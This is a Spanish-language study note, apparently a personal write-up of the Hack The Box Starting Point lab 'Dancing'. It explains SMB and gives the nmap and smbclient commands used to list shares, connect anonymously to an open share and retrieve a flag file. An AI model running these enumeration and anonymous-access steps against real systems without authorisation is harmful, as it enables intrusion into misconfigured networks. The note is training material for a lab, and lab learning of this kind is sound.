![[Pasted image 20260620174246.png]]

SMB (Server Message Block) es un protocolo de Windows usado para compartir archivos, carpetas e impresoras en una red. Es básicamente el equivalente de FTP pero pensado para entornos Windows/empresariales.

Lo importante:

- Funciona normalmente en el puerto 445
- Se usa muchísimo en empresas para compartir carpetas entre departamentos
- Es uno de los protocolos más atacados en Red Team porque suele estar mal configurado (carpetas compartidas sin contraseña, permisos demasiado abiertos...)
- Herramientas típicas para explorarlo: `smbclient`, `smbmap`, `enum4linux`
![[Pasted image 20260620174648.png]]
![[Pasted image 20260620174718.png]]

![[Pasted image 20260620174734.png]]
![[Pasted image 20260620174749.png]]

![[Pasted image 20260620175343.png]]
![[Pasted image 20260620175408.png]]

### Resumen, Máquina "Dancing" (HTB Starting Point)

#### 1. Reconocimiento con Nmap

```
nmap -sV <IP>
```

Te mostró el puerto 445 abierto con el servicio SMB (Microsoft Directory Service / netbios-ssn, dependiendo de cómo lo etiquete Nmap).

#### 2. Listar carpetas compartidas

```
smbclient -L <IP>
```

El flag `-L` ("List") te muestra todas las carpetas (shares) que el servidor ofrece, sin necesidad de entrar a ninguna todavía. Entre ellas encontraste WorkShares, accesible sin contraseña.

#### 3. Conectarse a la carpeta compartida

```
smbclient \\\\<IP>\\WorkShares
```

Contraseña en blanco → acceso directo, sin autenticación real.

#### 4. Navegar dentro del share

Una vez dentro viste dos carpetas: `Amy.J` y `James.P`. Tuviste que navegar dentro de cada una (`cd carpeta` + `ls`) hasta encontrar el archivo de la flag, igual que en un sistema de archivos normal.

#### 5. Descargar y leer la flag

```
get flag.txt
exit
cat flag.txt
```

#### Conclusión

Mismo patrón que en Meow y Fawn: un servicio mal configurado que permite acceso sin autenticación expone información sensible. Aquí el "fallo" es una carpeta compartida en red accesible por cualquiera sin contraseña.